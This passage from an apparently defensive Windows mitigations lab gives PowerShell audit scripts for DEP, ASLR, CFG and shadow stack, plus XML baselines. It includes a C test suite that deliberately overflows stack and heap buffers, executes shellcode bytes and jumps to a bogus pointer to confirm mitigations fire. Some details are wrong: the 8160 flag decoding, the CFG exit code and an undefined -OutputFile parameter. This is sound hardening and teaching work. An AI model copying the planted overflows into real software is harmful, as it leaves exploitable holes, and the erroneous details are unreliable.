        if ($shadowStackValue -eq "ON" -or $shadowStackValue -eq $true -or $shadowStackValue -eq 1) {
            Write-Host "  [+] User-mode Shadow Stack: Enabled" -ForegroundColor Green
        } elseif ($shadowStackValue -eq "OFF" -or $shadowStackValue -eq $false -or $shadowStackValue -eq 0) {
            Write-Host "  [-] User-mode Shadow Stack: Explicitly disabled" -ForegroundColor Red
        } elseif ([string]::IsNullOrEmpty($shadowStackValue) -or $shadowStackValue -eq "NOTSET" -or $null -eq $shadowStackValue) {
            Write-Host "  [-] User-mode Shadow Stack: Not configured" -ForegroundColor Yellow
            Write-Host "      To enable: Set-ProcessMitigation -System -Enable UserShadowStack" -ForegroundColor Gray
            Write-Host "      Requires: Windows 11 22H2+, CET-enabled in BIOS" -ForegroundColor Gray
        } else {
            Write-Host "  [?] User-mode Shadow Stack: Unknown status ($shadowStackValue)" -ForegroundColor Yellow
        }

        # Check kernel shadow stack (Windows 11 24H2+)
        if ($mitigation.PSObject.Properties.Name -contains "KernelShadowStack") {
            $kernelShadow = $mitigation.KernelShadowStack
            $kernelValue = $kernelShadow.Enable

            Write-Host "  Debug: KernelShadowStack.Enable = '$kernelValue'" -ForegroundColor Gray

            if ($kernelValue -eq "ON" -or $kernelValue -eq $true -or $kernelValue -eq 1) {
                Write-Host "  [+] Kernel-mode Shadow Stack: Enabled" -ForegroundColor Green
            } elseif ($kernelValue -eq "OFF" -or $kernelValue -eq $false -or $kernelValue -eq 0) {
                Write-Host "  [-] Kernel-mode Shadow Stack: Explicitly disabled" -ForegroundColor Red
            } elseif ([string]::IsNullOrEmpty($kernelValue) -or $kernelValue -eq "NOTSET" -or $null -eq $kernelValue) {
                Write-Host "  [-] Kernel-mode Shadow Stack: Not configured" -ForegroundColor Yellow
                Write-Host "      Requires Windows 11 24H2+ and BIOS CET support" -ForegroundColor Gray
            } else {
                Write-Host "  [?] Kernel-mode Shadow Stack: Unknown status ($kernelValue)" -ForegroundColor Yellow
            }
        } else {
            Write-Host "  [-] Kernel-mode Shadow Stack: Not available (requires Windows 11 24H2+)" -ForegroundColor Yellow
        }

        # Check Windows version
        $osVersion = [System.Environment]::OSVersion.Version
        $buildNumber = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild
        $displayVersion = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion

        Write-Host "`n  Windows Version: $($osVersion.Major).$($osVersion.Minor) Build $buildNumber" -ForegroundColor Gray

        if ($buildNumber -ge 26100) {
            Write-Host "  [+] Windows 11 24H2+ detected (Build $buildNumber)" -ForegroundColor Green
            Write-Host "      CET/Shadow Stack is supported on this version" -ForegroundColor Gray
            Write-Host "      If not working, check BIOS settings for CET/IBT support" -ForegroundColor Gray
        } elseif ($buildNumber -ge 22621) {
            Write-Host "  [+] Windows 11 22H2+ detected (Build $buildNumber)" -ForegroundColor Green
            Write-Host "      User-mode Shadow Stack is supported" -ForegroundColor Gray
        } elseif ($buildNumber -ge 22000) {
            Write-Host "  [~] Windows 11 detected (Build $buildNumber)" -ForegroundColor Yellow
            Write-Host "      User-mode Shadow Stack requires 22H2+ (Build 22621+)" -ForegroundColor Yellow
        } else {
            Write-Host "  [!] Windows 10 detected (Build $buildNumber)" -ForegroundColor Yellow
            Write-Host "      CET/Shadow Stack requires Windows 11 (Build 22000+)" -ForegroundColor Yellow
        }

    } catch {
        Write-Host "  [~] Could not query Shadow Stack status: $($_.Exception.Message)" -ForegroundColor Yellow
    }
} else {
    Write-Host "[-] CET: CPU does not support CET ($($cpu.Name))" -ForegroundColor Yellow
    Write-Host "    CET requires: Intel 11th Gen (Tiger Lake)+, or AMD Zen 3+" -ForegroundColor Gray
}

# 7. Check Exploit Protection
Write-Host "`n[*] Checking Exploit Protection..." -ForegroundColor Yellow
try {
    $exploitProtection = Get-ProcessMitigation -System

    # DEP
    $depStatus = $exploitProtection.DEP.Enable
    if ($depStatus -in @("ON", $true)) {
        Write-Host "  [+] DEP (System): Enabled" -ForegroundColor Green
    } elseif ($depStatus -eq "NOTSET") {
        Write-Host "  [~] DEP (System): Not configured (uses default)" -ForegroundColor Yellow
    } else {
        Write-Host "  [-] DEP (System): $depStatus" -ForegroundColor Red
    }

    # ASLR
    $aslrStatus = $exploitProtection.ASLR.ForceRelocateImages
    if ($aslrStatus -in @("ON", $true)) {
        Write-Host "  [+] ASLR (System): Force relocate enabled" -ForegroundColor Green
    } elseif ($aslrStatus -eq "NOTSET") {
        Write-Host "  [~] ASLR (System): Not forced (per-binary ASLR still active)" -ForegroundColor Yellow
    } else {
        Write-Host "  [-] ASLR (System): $aslrStatus" -ForegroundColor Red
    }

    # Heap Integrity
    $heapStatus = $exploitProtection.Heap.TerminateOnError
    if ($heapStatus -in @("ON", $true)) {
        Write-Host "  [+] Heap Integrity: Terminate on error enabled" -ForegroundColor Green
    } elseif ($heapStatus -eq "NOTSET") {
        Write-Host "  [~] Heap Integrity: Not configured (default protection active)" -ForegroundColor Yellow
    } else {
        Write-Host "  [-] Heap Integrity: $heapStatus" -ForegroundColor Red
    }

    # CFG
    $cfgStatus = $exploitProtection.CFG.Enable
    if ($cfgStatus -in @("ON", $true)) {
        Write-Host "  [+] Control Flow Guard: Enabled system-wide" -ForegroundColor Green
    } elseif ($cfgStatus -eq "NOTSET") {
        Write-Host "  [~] CFG: Not forced (per-binary CFG still works)" -ForegroundColor Yellow
    } else {
        Write-Host "  [-] CFG: $cfgStatus" -ForegroundColor Red
    }

    Write-Host "`n  Note: NOTSET means Windows uses default behavior (mitigations still active)" -ForegroundColor Gray
} catch {
    Write-Host "  [!] Could not query Exploit Protection settings" -ForegroundColor Red
}

Write-Host "`n=== Audit Complete ===" -ForegroundColor Cyan
```

**Run Audit**:

```bash
Set-ExecutionPolicy Bypass -Scope Process -Force
.\src\mitigation_audit.ps1 > audit_report.txt
```

### ProcessMitigation PowerShell Module

**Available Cmdlets**:

- `Get-ProcessMitigation` - Query current settings
- `Set-ProcessMitigation` - Configure mitigations
- `ConvertTo-ProcessMitigationPolicy` - Convert policy formats

**System-Wide Configuration**:

```bash
# View all system mitigations
Get-ProcessMitigation -System

# Enable DEP system-wide
Set-ProcessMitigation -System -Enable DEP

# Enable multiple mitigations
Set-ProcessMitigation -System -Enable DEP, SEHOP, ForceRelocateImages

# Enable CFG system-wide
Set-ProcessMitigation -System -Enable CFG

# Enable User Shadow Stack (Windows 11 22H2+, requires CET-capable CPU)
Set-ProcessMitigation -System -Enable UserShadowStack

# Reset system settings to defaults
Set-ProcessMitigation -System -Reset
```

**Per-Application Configuration**:

```bash
# Check specific application
Get-ProcessMitigation -Name notepad.exe

# Enable CFG for application
Set-ProcessMitigation -Name "myapp.exe" -Enable CFG

# Disable specific mitigation (for legacy apps)
Set-ProcessMitigation -Name "legacy.exe" -Disable ForceRelocateImages

# Multiple settings at once
Set-ProcessMitigation -Name "secure.exe" `
    -Enable DEP, CFG, SEHOP, ForceRelocateImages `
    -Disable EmulateAtlThunks

# Remove application-specific overrides (revert to system defaults)
Set-ProcessMitigation -Name "myapp.exe" -Remove
```

**Export/Import Configurations**:

```bash
# Export ALL per-application mitigation overrides to XML
Get-ProcessMitigation -RegistryConfigFilePath settings.xml

# Import settings from XML
Set-ProcessMitigation -PolicyFilePath .\settings.xml

# Convert EMET policy to ProcessMitigation format
ConvertTo-ProcessMitigationPolicy -EMETFilePath .\emet.xml -OutputFilePath .\converted.xml
```

**Important Notes**:

- Export only saves **per-application overrides**, not system-wide defaults
- System defaults are built into Windows and don't need to be exported
- You cannot export just `-System` or just `-Name` - it's all per-app configs or nothing
- The XML format uses `<AppConfig Executable="...">` for each application

### Scenario: The Legacy App Exception

Security Engineers often face a dilemma: a critical business application crashes with ASLR enabled. You must create an exception.

### Binary Analysis

**Using dumpbin (Recommended - included with Visual Studio)**:

```bash
# Check PE headers for mitigation flags
dumpbin /headers bin\vuln_server_cfg.exe | findstr "DLL characteristics"

# Look for these flags in hex:
# 0x0040 - Dynamic base (ASLR)
# 0x0100 - NX compatible (DEP)
# 0x0400 - No SEH
# 0x4000 - Control Flow Guard
# 0x8000 - Guard CF function table present
# 0x0020 - High Entropy VA (64-bit ASLR)

# Example output:
#            8160 DLL characteristics
#                   High Entropy Virtual Addresses
#                   Dynamic base
#                   NX compatible
#                   Control Flow Guard

# Decode hex flags manually:
# C120 = 0x4000 (CFG) + 0x8000 (CFG table) + 0x0100 (DEP) + 0x0020 (High Entropy)
# 8160 = 0x4000 (CFG) + 0x4000 (CFG) + 0x0100 (DEP) + 0x0040 (ASLR) + 0x0020 (High Entropy)

# Check for CFG specifically
dumpbin /loadconfig bin\vuln_server_cfg.exe | findstr "Guard"

# Quick mitigation checker script
function Check-Mitigations {
    param([string]$Path)

    $output = dumpbin /headers $Path 2>&1 | Out-String
    $match = $output -match '([0-9A-F]+)\s+DLL characteristics'

    if ($match) {
        $hex = $matches[1]
        $value = [Convert]::ToInt32($hex, 16)

        [PSCustomObject]@{
            Binary = Split-Path $Path -Leaf
            ASLR = ($value -band 0x0040) -ne 0
            DEP = ($value -band 0x0100) -ne 0
            CFG = ($value -band 0x4000) -ne 0
            HighEntropyVA = ($value -band 0x0020) -ne 0
            HexValue = "0x$hex"
        }
    } else {
        Write-Error "Could not parse DLL characteristics from $Path"
    }
}

# Usage: Check-Mitigations "bin\myapp.exe"
```

**Using PowerShell to check running processes**:

```bash
# Check mitigation policies for all running processes
Get-Process | ForEach-Object {
    $name = $_.ProcessName
    try {
        $mitigation = Get-ProcessMitigation -Name "$name.exe" -ErrorAction SilentlyContinue
        if ($mitigation) {
            [PSCustomObject]@{
                Process = $name
                DEP = $mitigation.DEP.Enable
                ASLR = $mitigation.ASLR.ForceRelocateImages
                CFG = $mitigation.CFG.Enable
                SEHOP = $mitigation.SEHOP.Enable
            }
        }
    } catch {}
} | Where-Object { $_.DEP -ne 'NOTSET' -or $_.ASLR -ne 'NOTSET' -or $_.CFG -ne 'NOTSET' } | Format-Table -AutoSize

# Note: This shows policy overrides, not actual binary mitigations
# NOTSET means using default Windows behavior (which is usually secure)
# To check actual PE binary flags, use Check-Mitigations function or dumpbin
```

**Manual PE Header Check**:

```bash
# check_pe_security.ps1
param([string]$binary)

Write-Host "Analyzing: $binary" -ForegroundColor Cyan

# Use dumpbin (Visual Studio)
$headers = & dumpbin.exe /headers $binary 2>$null

# Check flags
$features = @{
    "ASLR" = $headers | Select-String "Dynamic base"
    "DEP" = $headers | Select-String "NX compatible"
    "CFG" = $headers | Select-String "Guard CF"
    "High Entropy ASLR" = $headers | Select-String "High Entropy Virtual Addresses"
    "Safe SEH" = $headers | Select-String "Safe SEH"
}

foreach ($feature in $features.Keys) {
    if ($features[$feature]) {
        Write-Host "[+] $feature: Enabled" -ForegroundColor Green
    } else {
        Write-Host "[-] $feature: Disabled" -ForegroundColor Red
    }
}
```

### Windows 11 24H2 Security Baseline

Microsoft's security baseline for 24H2 includes recommended mitigation settings:

**Recommended Exploit Protection Settings**:

| Mitigation         | Recommendation                     |
| ------------------ | ---------------------------------- |
| DEP                | Enable for all applications        |
| ASLR (BottomUp)    | Enable system-wide                 |
| ASLR (HighEntropy) | Enable for 64-bit apps             |
| CFG                | Enable where supported             |
| SEHOP              | Enable (default on)                |
| Heap Termination   | Enable                             |
| ACG                | Enable for browsers, security apps |

**VBS-Related Settings**:

- Memory Integrity (HVCI): Enable
- Kernel DMA Protection: Enable
- Credential Guard: Enable for enterprise

**Checking Baseline Compliance**:

```bash
# Export current settings
Get-ProcessMitigation -RegistryConfigFilePath current_settings.xml

# Compare with baseline (Microsoft Security Compliance Toolkit)
# Download from: https://www.microsoft.com/en-us/download/details.aspx?id=55319

# Manual comparison - check for risky overrides
[xml]$config = Get-Content current_settings.xml
$riskyApps = $config.MitigationPolicy.AppConfig | Where-Object {
    $_.DEP.Enable -eq 'false' -or
    $_.ASLR.ForceRelocateImages -eq 'false' -or
    $_.CFG.Enable -eq 'false'
}

if ($riskyApps) {
    Write-Host "WARNING: Found applications with weakened mitigations:" -ForegroundColor Red
    $riskyApps | ForEach-Object {
        Write-Host "  - $($_.Executable)" -ForegroundColor Yellow
        if ($_.DEP.Enable -eq 'false') { Write-Host "    DEP: Disabled" -ForegroundColor Red }
        if ($_.ASLR.ForceRelocateImages -eq 'false') { Write-Host "    ASLR: Disabled" -ForegroundColor Red }
        if ($_.CFG.Enable -eq 'false') { Write-Host "    CFG: Disabled" -ForegroundColor Red }
    }
} else {
    Write-Host "No risky mitigation overrides found" -ForegroundColor Green
}
```

### Exploit Protection XML Baseline Exercise

> [!TIP]
> **Enterprise Workflow**: Organizations use Exploit Protection XML policies to
> standardize mitigation settings across endpoints. This exercise teaches you
> to export, import, and audit these policies.

#### Step 1: Export Current Settings

```bash
# Export system-wide and per-app settings to XML
mkdir C:\Baselines
Get-ProcessMitigation -RegistryConfigFilePath C:\Baselines\current_settings.xml

# View the exported XML structure
Get-Content C:\Baselines\current_settings.xml | Select-Object -First 50
```

#### Step 2: Create a Hardened Baseline

Save the following as `hardened_baseline.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<MitigationPolicy>
  <AppConfig Executable="notepad.exe">
    <DEP Enable="true" EmulateAtlThunks="false" />
    <ASLR ForceRelocateImages="true" RequireInfo="false" />
  </AppConfig>

  <AppConfig Executable="calc.exe">
    <DEP Enable="true" EmulateAtlThunks="false" />
    <ASLR ForceRelocateImages="true" RequireInfo="false" />
    <CFG Enable="true" SuppressExports="false" />
  </AppConfig>
</MitigationPolicy>
```

**For system-wide settings**:

```bash
# Configure system-wide mitigations (not supported in XML)
Set-ProcessMitigation -System -Enable DEP, ForceRelocateImages, CFG, SEHOP, TerminateOnError
```

#### Step 3: Apply the Configuration

```bash
# Method 1: Import from XML (if it works)
Set-ProcessMitigation -PolicyFilePath C:\Baselines\hardened_baseline.xml

# Method 2: Direct PowerShell configuration (more reliable)
Set-ProcessMitigation -Name "chrome.exe" -Enable DEP, ForceRelocateImages, CFG, SEHOP
Set-ProcessMitigation -Name "msedge.exe" -Enable DEP, ForceRelocateImages, CFG

# Configure system-wide settings
Set-ProcessMitigation -System -Enable DEP, ForceRelocateImages, CFG, SEHOP, TerminateOnError

# Verify the configuration
Get-ProcessMitigation -Name chrome.exe
Get-ProcessMitigation -System
```

#### Step 4: Compare and Audit

```bash
# compare_baselines.ps1 - Compare current vs baseline settings
param(
    [string]$BaselinePath = "C:\Baselines\hardened_baseline.xml",
    [string]$CurrentPath = "C:\Baselines\current_settings.xml"
)

# Export fresh current settings
Get-ProcessMitigation -RegistryConfigFilePath $CurrentPath

# Load both XMLs
[xml]$baseline = Get-Content $BaselinePath
[xml]$current = Get-Content $CurrentPath

Write-Host "=== Exploit Protection Baseline Comparison ===" -ForegroundColor Cyan
Write-Host ""

# Compare System Config
Write-Host "System-Level Mitigations:" -ForegroundColor Yellow

$systemMitigations = @("DEP", "ASLR", "SEHOP", "Heap", "ControlFlowGuard")
foreach ($mit in $systemMitigations) {
    $baselineNode = $baseline.MitigationPolicy.SystemConfig.$mit
    $currentNode = $current.MitigationPolicy.SystemConfig.$mit

    if ($baselineNode -and $currentNode) {
        $baselineEnable = $baselineNode.Enable
        $currentEnable = $currentNode.Enable

        if ($baselineEnable -eq $currentEnable) {
            Write-Host "  [OK] $mit : $currentEnable" -ForegroundColor Green
        } else {
            Write-Host "  [!!] $mit : Expected=$baselineEnable, Actual=$currentEnable" -ForegroundColor Red
        }
    }
}

Write-Host ""
Write-Host "Per-Application Overrides:" -ForegroundColor Yellow
$currentApps = $current.MitigationPolicy.AppConfig | ForEach-Object { $_.Executable }
foreach ($app in $currentApps) {
    Write-Host "  - $app" -ForegroundColor Cyan
}
```

#### Step 5: Verify Effect on Test Binary

```bash
# Create test to verify baseline applies
# 1. Compile a test binary without hardening

# 2. Add per-process mitigation via policy

# 3. Apply policy

# 4. Check that mitigations are enforced at runtime

# DEP should show ON even though binary was compiled with /NXCOMPAT:NO
# (System policy overrides binary preference)
```

### Per-Binary PE Mitigation Audit Checklist

#### PowerShell Audit Script

Save as `audit_pe_mitigations.ps1`:

```bash
# audit_pe_mitigations.ps1
# Audits PE binary mitigations using dumpbin
param(
    [Parameter(Mandatory=$true)]
    [string]$TargetPath,

    [Parameter(Mandatory=$false)]
    [switch]$Recurse
)

# Function to find dumpbin.exe
function Find-Dumpbin {
    # Check if dumpbin is in PATH
    $dumpbin = Get-Command dumpbin.exe -ErrorAction SilentlyContinue
    if ($dumpbin) {
        return $dumpbin.Source
    }

    # Search common Visual Studio installation paths
    $vsPaths = @(
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\*\bin\Hostx64\x64\dumpbin.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Professional\VC\Tools\MSVC\*\bin\Hostx64\x64\dumpbin.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\*\bin\Hostx64\x64\dumpbin.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\*\bin\Hostx64\x64\dumpbin.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Professional\VC\Tools\MSVC\*\bin\Hostx64\x64\dumpbin.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Enterprise\VC\Tools\MSVC\*\bin\Hostx64\x64\dumpbin.exe"
    )

    foreach ($pattern in $vsPaths) {
        $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) {
            return $found.FullName
        }
    }

    return $null
}

# Find dumpbin
$dumpbinPath = Find-Dumpbin
if (-not $dumpbinPath) {
    Write-Error "dumpbin.exe not found. Please run this from Developer Command Prompt or install Visual Studio Build Tools."
    Write-Host "`nAlternative: Use the Check-Mitigations function instead:" -ForegroundColor Yellow
    Write-Host "  Check-Mitigations '$TargetPath'" -ForegroundColor Gray
    exit 1
}

Write-Host "Using dumpbin: $dumpbinPath" -ForegroundColor Gray

# Function to audit a single binary
function Audit-Binary {
    param([string]$FilePath)

    # Get DLL characteristics
    $output = & $dumpbinPath /headers $FilePath 2>&1 | Out-String
    $match = $output -match '([0-9A-F]+)\s+DLL characteristics'

    if ($match) {
        $hex = $matches[1]
        $value = [Convert]::ToInt32($hex, 16)

        return [PSCustomObject]@{
            Binary = Split-Path $FilePath -Leaf
            Path = $FilePath
            HexValue = "0x$hex"
            DEP = ($value -band 0x0100) -ne 0
            ASLR = ($value -band 0x0040) -ne 0
            HighEntropyVA = ($value -band 0x0020) -ne 0
            CFG = ($value -band 0x4000) -ne 0
            CFGTable = ($value -band 0x8000) -ne 0
            NoSEH = ($value -band 0x0400) -ne 0
        }
    }
    return $null
}

# Check if target is a directory
if (Test-Path $TargetPath -PathType Container) {
    if (-not $Recurse) {
        Write-Error "Target is a directory. Use -Recurse to scan all binaries in the directory."
        exit 1
    }

    Write-Host "`n=== Scanning Directory: $TargetPath ===" -ForegroundColor Cyan

    # Find all PE files
    $files = Get-ChildItem -Path $TargetPath -Include *.exe,*.dll -Recurse -ErrorAction SilentlyContinue

    if ($files.Count -eq 0) {
        Write-Host "No PE files found in directory" -ForegroundColor Yellow
        exit 0
    }

    Write-Host "Found $($files.Count) PE files. Analyzing..." -ForegroundColor White

    $results = @()
    $processed = 0

    foreach ($file in $files) {
        $processed++
        if ($processed % 10 -eq 0) {
            Write-Progress -Activity "Scanning binaries" -Status "$processed of $($files.Count)" -PercentComplete (($processed / $files.Count) * 100)
        }

        try {
            $result = Audit-Binary -FilePath $file.FullName
            if ($result) {
                $results += $result
            }
        } catch {
            # Skip files that can't be analyzed
        }
    }

    Write-Progress -Activity "Scanning binaries" -Completed

    # Display summary
    Write-Host "`n=== Summary ===" -ForegroundColor Cyan
    Write-Host "Total binaries analyzed: $($results.Count)" -ForegroundColor White

    $stats = @{
        DEP = ($results | Where-Object { $_.DEP }).Count
        ASLR = ($results | Where-Object { $_.ASLR }).Count
        HighEntropyVA = ($results | Where-Object { $_.HighEntropyVA }).Count
        CFG = ($results | Where-Object { $_.CFG }).Count
    }

    Write-Host "`nMitigation Coverage:" -ForegroundColor Yellow
    foreach ($mitigation in $stats.GetEnumerator() | Sort-Object Name) {
        $percentage = [math]::Round(($mitigation.Value / $results.Count) * 100, 1)
        Write-Host "  $($mitigation.Key): $($mitigation.Value)/$($results.Count) ($percentage%)" -ForegroundColor White
    }

    # Show binaries without key mitigations
    Write-Host "`nBinaries without DEP:" -ForegroundColor Red
    $results | Where-Object { -not $_.DEP } | Select-Object -First 10 Binary | ForEach-Object { Write-Host "  - $($_.Binary)" -ForegroundColor Yellow }

    Write-Host "`nBinaries without ASLR:" -ForegroundColor Red
    $results | Where-Object { -not $_.ASLR } | Select-Object -First 10 Binary | ForEach-Object { Write-Host "  - $($_.Binary)" -ForegroundColor Yellow }

    Write-Host "`nBinaries without CFG:" -ForegroundColor Red
    $results | Where-Object { -not $_.CFG } | Select-Object -First 10 Binary | ForEach-Object { Write-Host "  - $($_.Binary)" -ForegroundColor Yellow }

    # Export to CSV
    $csvPath = "mitigation_audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
    $results | Export-Csv -Path $csvPath -NoTypeInformation
    Write-Host "`nFull results exported to: $csvPath" -ForegroundColor Green

    exit 0
}

# Verify target exists
if (-not (Test-Path $TargetPath)) {
    Write-Error "Target file not found: $TargetPath"
    exit 1
}

$TargetPath = Resolve-Path $TargetPath

Write-Host "`n=== PE Mitigation Audit ===" -ForegroundColor Cyan
Write-Host "Target: $TargetPath`n" -ForegroundColor White

# Get DLL characteristics
$output = & $dumpbinPath /headers $TargetPath 2>&1 | Out-String
$match = $output -match '([0-9A-F]+)\s+DLL characteristics'

if ($match) {
    $hex = $matches[1]
    $value = [Convert]::ToInt32($hex, 16)

    Write-Host "DLL Characteristics: 0x$hex" -ForegroundColor White
    Write-Host ""

    # Check each mitigation
    $mitigations = @{
        "DEP (NX)" = @{ Flag = 0x0100; Enabled = ($value -band 0x0100) -ne 0 }
        "ASLR (Dynamic Base)" = @{ Flag = 0x0040; Enabled = ($value -band 0x0040) -ne 0 }
        "High Entropy VA" = @{ Flag = 0x0020; Enabled = ($value -band 0x0020) -ne 0 }
        "Control Flow Guard" = @{ Flag = 0x4000; Enabled = ($value -band 0x4000) -ne 0 }
        "Guard CF Function Table" = @{ Flag = 0x8000; Enabled = ($value -band 0x8000) -ne 0 }
        "No SEH" = @{ Flag = 0x0400; Enabled = ($value -band 0x0400) -ne 0 }
        "Terminal Server Aware" = @{ Flag = 0x0800; Enabled = ($value -band 0x0800) -ne 0 }
    }

    foreach ($mitigation in $mitigations.GetEnumerator() | Sort-Object Name) {
        $status = if ($mitigation.Value.Enabled) { "[+]" } else { "[-]" }
        $color = if ($mitigation.Value.Enabled) { "Green" } else { "Red" }
        $flagHex = "0x{0:X4}" -f $mitigation.Value.Flag

        Write-Host "$status $($mitigation.Key) ($flagHex)" -ForegroundColor $color
    }

    # Check for CFG details
    Write-Host "`n--- Control Flow Guard Details ---" -ForegroundColor Yellow
    $cfgOutput = & $dumpbinPath /loadconfig $TargetPath 2>&1 | Select-String "Guard"
    if ($cfgOutput) {
        $cfgOutput | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
    } else {
        Write-Host "  No CFG information found" -ForegroundColor Gray
    }

} else {
    Write-Error "Could not parse DLL characteristics from binary"
    exit 1
}

Write-Host "`n=== Audit Complete ===" -ForegroundColor Cyan
```

#### Usage Examples

```bash
# Audit current directory
.\src\audit_pe_mitigations.ps1 -TargetPath "bin\acg_test.exe"

# Audit Windows System32 (requires admin)
.\src\audit_pe_mitigations.ps1 -TargetPath "C:\Windows\System32" -Recurse

# Audit your application deployment
.\src\audit_pe_mitigations.ps1 -TargetPath "C:\Program Files\MyApp" -Recurse -OutputFile "myapp_audit.csv"
```

### End-to-End Testing

**Test Suite for All Mitigations**:

```c
// mitigation_test_suite.c
// Compile with ALL protections, then test each
//
// IMPORTANT: Stack cookie (/GS) and CFG failures use __fastfail()
// which generates a non-continuable exception that CANNOT be caught
// by __try/__except. These mitigations terminate the process immediately.
//
// For reliable testing, run each test as a SEPARATE PROCESS and check
// the exit code. The wrapper below demonstrates this approach.

#include <windows.h>
#include <stdio.h>
#include <string.h>

// Exit codes to identify which mitigation triggered
// NOTE: These are arbitrary values for our testing purposes
#define EXIT_DEP_BLOCKED      0xDE9     // 3561 decimal
#define EXIT_COOKIE_BLOCKED   0xC001E   // 786462 decimal
#define EXIT_CFG_BLOCKED      0xCF6     // 3318 decimal
#define EXIT_HEAP_BLOCKED     0xEA9     // 3753 decimal
#define EXIT_TEST_PASSED      0

// Test 1: DEP (should block shellcode execution)
// DEP violations ARE catchable via SEH (they're access violations)
void test_dep() {
    printf("\n=== Testing DEP ===\n");
    fflush(stdout);

    char shellcode[] = "\xCC\xC3";  // int3; ret (in .data section = NX)
    void (*func)() = (void(*)())shellcode;

    __try {
        func();  // Should crash (DEP blocks execution)
        printf("[-] DEP FAILED: Shellcode executed!\n");
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[+] DEP OK: Shellcode blocked (Access Violation)\n");
    }
    fflush(stdout);
}

// Test 2: Stack Cookie - MUST run as separate process
// __fastfail() cannot be caught by SEH!
void test_stack_cookie_inner() {
    char buffer[64];
    printf("[*] Triggering stack cookie overflow...\n");
    fflush(stdout);
    memset(buffer, 'A', 200);  // Overflow corrupts cookie
    // Cookie check at function epilogue triggers __fastfail()
    // Process terminates with exit code 0xC0000409 - NOT catchable!
}

void test_stack_cookie() {
    printf("\n=== Testing Stack Cookie ===\n");
    printf("[*] NOTE: Cookie failures use __fastfail() - not SEH-catchable\n");
    printf("[*] Run 'mitigation_test_suite.exe --cookie' separately\n");
    printf("[*] Expected exit code: 0xC0000409 (STATUS_STACK_BUFFER_OVERRUN)\n");
    fflush(stdout);
}

// Test 3: CFG - MUST run as separate process
// __fastfail(FAST_FAIL_GUARD_ICALL_CHECK_FAILURE) cannot be caught!
void test_cfg_inner() {
    printf("[*] Calling invalid address 0x41414141 via function pointer...\n");
    fflush(stdout);
    void (*func_ptr)() = (void(*)())0x41414141;
    func_ptr();  // CFG blocks, calls __fastfail(10)
}

void test_cfg() {
    printf("\n=== Testing CFG ===\n");
    printf("[*] NOTE: CFG failures use __fastfail() - not SEH-catchable\n");
    printf("[*] Run 'mitigation_test_suite.exe --cfg' separately\n");
    printf("[*] Expected exit code: 0x80000003 (STATUS_BREAKPOINT via __fastfail)\n");
    printf("[*] NOTE: /GS cookie failure = 0xC0000409, CFG failure = 0x80000003\n");
    printf("[*]       They use different __fastfail subcodes but same mechanism\n");
    fflush(stdout);
}

// Test 4: Heap Cookie (may or may not be catchable depending on failure mode)
void test_heap_protection() {
    printf("\n=== Testing Heap Protection ===\n");
    printf("[*] NOTE: Modern heap (Segment Heap) may not place chunks adjacently\n");
    fflush(stdout);

    __try {
        char *chunk1 = (char*)HeapAlloc(GetProcessHeap(), 0, 64);
        char *chunk2 = (char*)HeapAlloc(GetProcessHeap(), 0, 64);

        printf("[*] chunk1=%p, chunk2=%p, gap=%lld\n",
               chunk1, chunk2, (long long)(chunk2-chunk1));
        fflush(stdout);

        // Overflow - may or may not corrupt chunk2 depending on allocator
        memset(chunk1, 'A', 128);

        // Free may detect corruption (or may not, depending on heap layout)
        HeapFree(GetProcessHeap(), 0, chunk2);
        HeapFree(GetProcessHeap(), 0, chunk1);

        printf("[?] Heap test completed - corruption may not be adjacent\n");
        printf("    Use 'gflags /p /enable <exe> /full' for guaranteed detection\n");
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[+] Heap Protection OK: Corruption detected\n");
    }
    fflush(stdout);
}

int main(int argc, char** argv) {
    // Allow running individual tests that will crash
    if (argc > 1) {
        if (strcmp(argv[1], "--cookie") == 0) {
            test_stack_cookie_inner();  // Will __fastfail -> exit 0xC0000409
            return 0;
        }
        if (strcmp(argv[1], "--cfg") == 0) {
            test_cfg_inner();  // Will __fastfail -> exit 0x80000003
            return 0;
        }
    }

    printf("=== Windows Mitigation Test Suite ===\n");
    printf("This tests each protection mechanism.\n");
    printf("\nIMPORTANT: /GS and CFG use __fastfail() which bypasses SEH!\n");
    printf("To test those, run with --cookie or --cfg flags separately.\n");
    fflush(stdout);

    test_dep();
    test_stack_cookie();  // Just prints instructions
    test_cfg();           // Just prints instructions
    test_heap_protection();

    printf("\n=== Partial Test Suite Complete ===\n");
    printf("\nTo fully test /GS and CFG, run:\n");
    printf("  .\\mitigation_test_suite.exe --cookie\n");
    printf("    Expected exit: 0xC0000409 (STATUS_STACK_BUFFER_OVERRUN)\n");
    printf("  .\\mitigation_test_suite.exe --cfg\n");
    printf("    Expected exit: 0x80000003 (STATUS_BREAKPOINT via __fastfail)\n");
    fflush(stdout);

    return 0;
}
```

**Compile Test Suite**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\mitigation_test_suite.c
cd C:\Windows_Mitigations_Lab

# Compile with ALL protections enabled
cl /GS /Zi /guard:cf src\mitigation_test_suite.c /Fe:bin\mitigation_test_suite.exe /link /NXCOMPAT /DYNAMICBASE /guard:cf /DEBUG

# Run main test suite (DEP + heap tests in-process)
.\bin\mitigation_test_suite.exe

# Run cookie test separately (process will terminate)
.\bin\mitigation_test_suite.exe --cookie
echo Exit code: %errorlevel%
# Expected: 0xC0000409 (-1073740791 decimal)

# Run CFG test separately (process will terminate)
.\bin\mitigation_test_suite.exe --cfg
echo Exit code: %errorlevel%
# Expected: 0x80000003 (-2147483645 decimal) OR 0xC0000409 (-1073740791 decimal)
